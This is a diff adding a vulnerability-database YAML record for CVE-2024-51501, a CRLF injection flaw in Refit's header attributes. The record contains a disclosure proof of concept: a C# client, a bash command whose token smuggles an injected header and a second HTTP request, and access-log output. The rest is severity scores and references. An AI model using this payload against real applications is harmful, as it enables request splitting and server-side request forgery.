@@ -1,0 +1,373 @@
+vulnerability_id: VCID-nyqk-s3s5-ckh6
+aliases:
+  - CVE-2024-51501
+  - GHSA-3hxg-fxwm-8gf7
+summary: "CRLF injection in Refit's [Header], [HeaderCollection] and [Authorize] attributes\n\
+  ### Summary\nThe various header-related Refit attributes (Header, HeaderCollection and Authorize)\
+  \ are vulnerable to CRLF injection.\n\n### Details\nThe way HTTP headers are added to a request\
+  \ is via the `HttpHeaders.TryAddWithoutValidation` method: <https://github.com/reactiveui/refit/blob/258a771f44417c6e48e103ac921fe4786f3c2a1e/Refit/RequestBuilderImplementation.cs#L1328>\n\
+  This method does not check for CRLF characters in the header value.\n\nThis means that any\
+  \ headers added to a refit request are vulnerable to CRLF-injection. In general, CRLF-injection\
+  \ into a HTTP header (when using HTTP/1.1) means that one can inject additional HTTP headers\
+  \ or smuggle whole HTTP requests.\n\n### PoC\nThe below example code creates a console app\
+  \ that takes one command line variable (a bearer token) and then makes a request to some status\
+  \ page with the provided token inserted in the \"Authorization\" header:\n\n```c#\nusing Refit;\n\
+  \ninternal class Program\n{\n    private static void Main(string[] args)\n    {\n        //\
+  \ Usage: dotnet run <bearer token> \n        string token = args[0];\n        var service\
+  \ = RestService.For<IStatusApi>(\"http://insert.some.site.here\");\n        string response\
+  \ = service.GetStatus(token).Result;\n        Console.WriteLine($\"Response: {response}\"\
+  );\n    }\n\n    public interface IStatusApi\n    {\n        [Get(\"/status\")]\n        Task<string>\
+  \ GetStatus([Authorize(\"Bearer\")] string token);\n    }\n}\n```\n\nThis application is now\
+  \ vulnerable to CRLF-injection, and can thus be abused to for example perform request splitting\
+  \ and thus server side request forgery (SSRF):\n\n```bash\nanonymous@ubuntu-sofia-672448:~$\
+  \ dotnet Refit-cli.dll $'test\\r\\nUser-Agent: injected header!\\r\\n\\r\\nGET /smuggled HTTP/1.1\\\
+  r\\nHost: insert.some.site.here'\nResponse: <html></html>\n```\n\nThe application intends\
+  \ to send a single request of the form:\n```http\nGET /status HTTP/1.1\nHost: insert.some.site.here\n\
+  Authorization: Bearer <bearer token>\n```\nBut as the application is vulnerable to CRLF injection\
+  \ the above command will instead result in the following two requests being sent:\n```http\n\
+  GET /status HTTP/1.1\nHost: insert.some.site.here\nAuthorization: Bearer test\nUser-Agent:\
+  \ injected header!\n```\nand\n```http\nGET /smuggled HTTP/1.1\nHost: insert.some.site.here\n\
+  ```\n\nThis can be confirmed by checking the access logs on the server where these commands\
+  \ were run (with `insert.some.site.here` pointing to localhost):\n```bash\nanonymous@ubuntu-sofia-672448:~$\
+  \ sudo tail /var/log/apache2/access.log\n127.0.0.1 - - [29/Aug/2024:12:17:34 +0000] \"GET\
+  \ /status HTTP/1.1\" 200 240 \"-\" \"injected header!\"\n127.0.0.1 - - [29/Aug/2024:12:17:34\
+  \ +0000] \"GET /smuggled HTTP/1.1\" 404 436 \"-\" \"-\"\n```\n\n### Impact\nIf an application\
+  \ using the Refit library passes a user-controllable value through to a header, then that\
+  \ application becomes vulnerable to CRLF-injection. This is not necessarily a security issue\
+  \ for a command line application like the one above, but if such code were present in a web\
+  \ application then it becomes vulnerable to request splitting (as shown in the PoC) and thus\
+  \ Server Side Request Forgery.\n\nStrictly speaking this is a potential vulnerability in applications\
+  \ using Refit, not in Refit itself, but I would argue that at the very least there needs to\
+  \ be a warning about this behaviour in the Refit documentation."
+severities:
+  - score: '0.00042'
+    scoring_system: epss
+    scoring_elements: '0.12189'
+    published_at: '2025-04-16 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00042'
+    scoring_system: epss
+    scoring_elements: '0.12133'
+    published_at: '2025-04-15 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00042'
+    scoring_system: epss
+    scoring_elements: '0.12278'
+    published_at: '2025-04-27 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00042'
+    scoring_system: epss
+    scoring_elements: '0.12286'
+    published_at: '2025-04-26 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00042'
+    scoring_system: epss
+    scoring_elements: '0.12284'
+    published_at: '2025-04-25 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00042'
+    scoring_system: epss
+    scoring_elements: '0.12269'
+    published_at: '2025-04-24 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00042'
+    scoring_system: epss
+    scoring_elements: '0.12268'
+    published_at: '2025-04-23 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00042'
+    scoring_system: epss
+    scoring_elements: '0.12289'
+    published_at: '2025-04-22 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00042'
+    scoring_system: epss
+    scoring_elements: '0.12304'
+    published_at: '2025-04-21 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00042'
+    scoring_system: epss
+    scoring_elements: '0.12344'
+    published_at: '2025-04-20 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00042'
+    scoring_system: epss
+    scoring_elements: '0.12266'
+    published_at: '2025-04-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00042'
+    scoring_system: epss
+    scoring_elements: '0.12367'
+    published_at: '2025-04-19 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00042'
+    scoring_system: epss
+    scoring_elements: '0.12363'
+    published_at: '2025-04-18 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00042'
+    scoring_system: epss
+    scoring_elements: '0.12293'
+    published_at: '2025-04-17 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10484'
+    published_at: '2024-12-03 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10184'
+    published_at: '2024-11-18 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10278'
+    published_at: '2024-11-20 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10302'
+    published_at: '2024-11-21 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10364'
+    published_at: '2024-11-23 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10366'
+    published_at: '2024-11-24 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10377'
+    published_at: '2024-11-26 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10429'
+    published_at: '2024-11-28 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10788'
+    published_at: '2024-12-11 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10843'
+    published_at: '2024-12-13 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10939'
+    published_at: '2024-12-15 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10859'
+    published_at: '2024-12-17 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10875'
+    published_at: '2024-12-19 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.10932'
+    published_at: '2024-12-27 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00043'
+    scoring_system: epss
+    scoring_elements: '0.11287'
+    published_at: '2025-01-16 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00094'
+    scoring_system: epss
+    scoring_elements: '0.23722'
+    published_at: '2025-03-30 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00094'
+    scoring_system: epss
+    scoring_elements: '0.23873'
+    published_at: '2025-04-02 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00094'
+    scoring_system: epss
+    scoring_elements: '0.23786'
+    published_at: '2025-03-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00104'
+    scoring_system: epss
+    scoring_elements: '0.25619'
+    published_at: '2025-04-12 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00104'
+    scoring_system: epss
+    scoring_elements: '0.25653'
+    published_at: '2025-04-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00104'
+    scoring_system: epss
+    scoring_elements: '0.25611'
+    published_at: '2025-04-13 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00104'
+    scoring_system: epss
+    scoring_elements: '0.25641'
+    published_at: '2025-04-03 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00104'
+    scoring_system: epss
+    scoring_elements: '0.25649'
+    published_at: '2025-04-04 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00104'
+    scoring_system: epss
+    scoring_elements: '0.25657'
+    published_at: '2025-04-05 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00104'
+    scoring_system: epss
+    scoring_elements: '0.25612'
+    published_at: '2025-04-06 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00104'
+    scoring_system: epss
+    scoring_elements: '0.25584'
+    published_at: '2025-04-07 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00104'
+    scoring_system: epss
+    scoring_elements: '0.25598'
+    published_at: '2025-04-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00104'
+    scoring_system: epss
+    scoring_elements: '0.2563'
+    published_at: '2025-04-09 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00104'
+    scoring_system: epss
+    scoring_elements: '0.25661'
+    published_at: '2025-04-10 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00106'
+    scoring_system: epss
+    scoring_elements: '0.17497'
+    published_at: '2025-03-29 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: '0.00133'
+    scoring_system: epss
+    scoring_elements: '0.29775'
+    published_at: '2025-04-14 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+  - score: CRITICAL
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/advisories/GHSA-3hxg-fxwm-8gf7
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/reactiveui/refit
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/reactiveui/refit
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/reactiveui/refit/blob/258a771f44417c6e48e103ac921fe4786f3c2a1e/Refit/RequestBuilderImplementation.cs#L1328
+  - score: 10
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
+    published_at: None
+    url: https://github.com/reactiveui/refit/blob/258a771f44417c6e48e103ac921fe4786f3c2a1e/Refit/RequestBuilderImplementation.cs#L1328
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/reactiveui/refit/blob/258a771f44417c6e48e103ac921fe4786f3c2a1e/Refit/RequestBuilderImplementation.cs#L1328
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2024-11-05T14:43:10Z/
+    published_at: None
+    url: https://github.com/reactiveui/refit/blob/258a771f44417c6e48e103ac921fe4786f3c2a1e/Refit/RequestBuilderImplementation.cs#L1328
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/reactiveui/refit/commit/483b1d8df18098f137ca0eca056b7e9ec19f70dd
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/reactiveui/refit/commit/483b1d8df18098f137ca0eca056b7e9ec19f70dd
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/reactiveui/refit/security/advisories/GHSA-3hxg-fxwm-8gf7
+  - score: CRITICAL
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/reactiveui/refit/security/advisories/GHSA-3hxg-fxwm-8gf7
+  - score: 10
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
+    published_at: None
+    url: https://github.com/reactiveui/refit/security/advisories/GHSA-3hxg-fxwm-8gf7
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/reactiveui/refit/security/advisories/GHSA-3hxg-fxwm-8gf7
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2024-11-05T14:43:10Z/
+    published_at: None
+    url: https://github.com/reactiveui/refit/security/advisories/GHSA-3hxg-fxwm-8gf7
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-51501
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-51501
+weaknesses:
+  - CWE-937
+  - CWE-1035
+  - CWE-93
+references:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2024-51501
+    reference_type:
+    reference_id:
+  - url: https://github.com/reactiveui/refit
+    reference_type:
+    reference_id:
+  - url: https://github.com/reactiveui/refit/blob/258a771f44417c6e48e103ac921fe4786f3c2a1e/Refit/RequestBuilderImplementation.cs#L1328
+    reference_type:
+    reference_id:
+  - url: https://github.com/reactiveui/refit/commit/483b1d8df18098f137ca0eca056b7e9ec19f70dd
+    reference_type:
+    reference_id:
+  - url: https://github.com/reactiveui/refit/security/advisories/GHSA-3hxg-fxwm-8gf7
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-51501
+    reference_type:
+    reference_id:
+  - url: https://github.com/advisories/GHSA-3hxg-fxwm-8gf7
+    reference_type:
+    reference_id: GHSA-3hxg-fxwm-8gf7
